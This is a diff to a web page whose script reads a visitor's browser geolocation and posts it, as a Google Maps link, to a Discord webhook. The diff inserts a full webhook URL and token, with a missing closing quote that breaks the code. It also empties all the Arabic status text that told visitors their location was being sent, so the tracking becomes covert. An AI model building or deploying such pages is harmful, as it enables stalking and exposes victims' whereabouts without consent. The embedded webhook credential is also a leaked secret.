@@ -28,8 +28,8 @@ body {
 </head>
 <body>
 <div class="card">
-<h1>جاري تحديد الموقع...</h1>
-<p>يرجى الضغط على "السماح" عند ظهور طلب الموقع.</p>
+<h1></h1>
+<p></p>
 </div>
 
 <script>
@@ -40,7 +40,7 @@ navigator.geolocation.getCurrentPosition(async (position) => {
 
     const map = `https://www.google.com/maps?q=${lat},${lng}`;
 
-    await fetch("REDACTED_WEBHOOK_URL", {
+    await fetch("https://discord.com/api/webhooks/1509662923193319569/gfmeiyOCQMq18bSQClWgBcLXOLKAdFIu88RPD3eAOcOohWawNjtppVE26bSL2sPdafZd, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -60,13 +60,13 @@ ${map}`
 
     document.body.innerHTML = `
     <div class="card">
-        <h1>تم إرسال الموقع بنجاح</h1>
+        <h1></h1>
     </div>`;
 },
 (error) => {
     document.body.innerHTML = `
     <div class="card">
-        <h1>يجب السماح بالوصول للموقع</h1>
+        <h1></h1>
     </div>`;
 },
 {
